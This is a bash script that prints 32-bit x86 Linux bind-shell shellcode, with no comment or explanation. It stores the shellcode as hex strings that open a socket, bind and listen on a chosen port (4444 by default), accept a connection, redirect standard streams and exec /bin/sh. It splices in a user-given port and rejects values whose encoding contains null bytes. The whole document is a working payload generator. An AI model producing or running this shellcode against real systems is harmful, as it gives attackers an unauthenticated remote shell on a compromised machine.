part_1="\x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xfe\xc3\x31\xc0\x50\x50\x50\x66\x68"
part_2="\x66\x53\x89\xe6\xb0\x66\x6a\x10\x56\x52\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x05\x6a\x10\x54\x56\x52\x89\xe1\xcd\x80\x89\xc2\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xfe\xc1\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xfe\xc1\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x8b\x14\x24\x54\x8d\x4c\x24\x04\xb0\x0b\xcd\x80"

if [[ ! $# == 1 ]]; then
    port="\x5c\x11"
elif [[ $1 -gt 1 ]] && [[ $1 -lt 256 ]]; then
    echo "Port values between 1 and 255 are unsupported, encoding is required"
    exit 1
elif [[ $1 -gt 255 ]] && [[ $1 -lt 65536 ]]; then
    v=`echo "obase=16; $1" | bc`
    if [[ 0x${v:2:2} -eq 0x0 ]]; then
        echo "Port contains nulls, requires encoding"
        exit 1
    fi
    port=`echo "\x${v:2:2}\x${v:0:2}" | tr '[:upper:]' '[:lower:]'`
else
    echo "Invalid port specified."
    exit 1
fi

echo $part_1$port$part_2
